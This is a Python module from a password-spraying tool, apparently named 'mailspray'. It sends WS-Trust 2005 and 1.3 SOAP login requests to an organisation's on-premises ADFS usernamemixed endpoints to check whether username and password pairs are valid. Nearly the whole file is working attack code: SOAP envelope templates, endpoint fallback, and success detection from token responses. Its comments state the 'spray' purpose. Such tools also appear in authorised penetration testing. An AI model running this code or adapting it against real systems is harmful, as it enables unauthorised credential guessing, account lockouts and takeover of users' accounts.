import xml.sax.saxutils as saxutils
from mailspray.core.base import BaseModule

# WS-Trust 2005 SOAP envelope for on-prem ADFS
_SOAP_2005 = """\
<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope'
            xmlns:a='http://www.w3.org/2005/08/addressing'
            xmlns:u='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd'>
  <s:Header>
    <a:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
    <a:To s:mustUnderstand='1'>{url}</a:To>
    <o:Security s:mustUnderstand='1'
                xmlns:o='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd'>
      <o:UsernameToken>
        <o:Username>{username}</o:Username>
        <o:Password>{password}</o:Password>
      </o:UsernameToken>
    </o:Security>
  </s:Header>
  <s:Body>
    <t:RequestSecurityToken xmlns:t='http://schemas.xmlsoap.org/ws/2005/02/trust'>
      <wsp:AppliesTo xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy'>
        <a:EndpointReference>
          <a:Address>{applies_to}</a:Address>
        </a:EndpointReference>
      </wsp:AppliesTo>
      <t:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</t:KeyType>
      <t:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</t:RequestType>
    </t:RequestSecurityToken>
  </s:Body>
</s:Envelope>"""

# WS-Trust 1.3 SOAP envelope (newer ADFS / ADFS 3.0+)
_SOAP_13 = """\
<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope'
            xmlns:a='http://www.w3.org/2005/08/addressing'
            xmlns:u='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd'>
  <s:Header>
    <a:Action s:mustUnderstand='1'>http://docs.oasis-open.org/ws-sx/ws-trust/200512/RST/Issue</a:Action>
    <a:To s:mustUnderstand='1'>{url}</a:To>
    <o:Security s:mustUnderstand='1'
                xmlns:o='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd'>
      <o:UsernameToken>
        <o:Username>{username}</o:Username>
        <o:Password>{password}</o:Password>
      </o:UsernameToken>
    </o:Security>
  </s:Header>
  <s:Body>
    <t:RequestSecurityToken xmlns:t='http://docs.oasis-open.org/ws-sx/ws-trust/200512'>
      <wsp:AppliesTo xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy'>
        <a:EndpointReference>
          <a:Address>{applies_to}</a:Address>
        </a:EndpointReference>
      </wsp:AppliesTo>
      <t:KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/Bearer</t:KeyType>
      <t:RequestType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/Issue</t:RequestType>
    </t:RequestSecurityToken>
  </s:Body>
</s:Envelope>"""

# ADFS SOAP fault codes indicating account lockout
_LOCKOUT_CODES = ("MSIS3012", "MSIS3019", "PasswordExpired", "AccountDisabled")


class ADFSModule(BaseModule):
    """ADFS WS-Trust endpoint spray (on-prem Active Directory Federation Services).

    Tries /adfs/services/trust/2005/usernamemixed first (WS-Trust 2005),
    falls back to /adfs/services/trust/13/usernamemixed (WS-Trust 1.3).

    Username MUST be in UPN format: user@domain.com
    """

    def __init__(self, target):
        super().__init__(target)
        if not self.port:
            self.port = 443
        if not self.scheme:
            self.scheme = "https"
        self.applies_to = "urn:federation:MicrosoftOnline"

    def _try_endpoint(self, session, endpoint, soap_template, username, password):
        body = soap_template.format(
            url=endpoint,
            username=saxutils.escape(username),
            password=saxutils.escape(password),
            applies_to=saxutils.escape(self.applies_to),
        ).encode("utf-8")
        headers = {
            "Content-Type": "application/soap+xml; charset=UTF-8",
            "SOAPAction": '""',
        }
        r = session.post(endpoint, data=body, headers=headers,
                         allow_redirects=False, timeout=self.timeout)
        return r

    def login(self, username, password):
        base = self.base_url()

        endpoints = [
            (f"{base}/adfs/services/trust/2005/usernamemixed", _SOAP_2005),
            (f"{base}/adfs/services/trust/13/usernamemixed",   _SOAP_13),
        ]

        for endpoint, soap in endpoints:
            session = self._new_session()
            try:
                r = self._try_endpoint(session, endpoint, soap, username, password)

                if r.status_code == 200:
                    # Sanity check: real token response contains RequestSecurityTokenResponse
                    if "RequestSecurityTokenResponse" in r.text:
                        return True
                    return False

                # 500 = SOAP fault (bad creds, lockout, user not found, etc.)
                # All of these are auth failures for spray purposes
                if r.status_code == 500:
                    return False

                # 404 on this endpoint — try next
                if r.status_code == 404:
                    continue

            except Exception:
                continue
            finally:
                session.close()

        return False
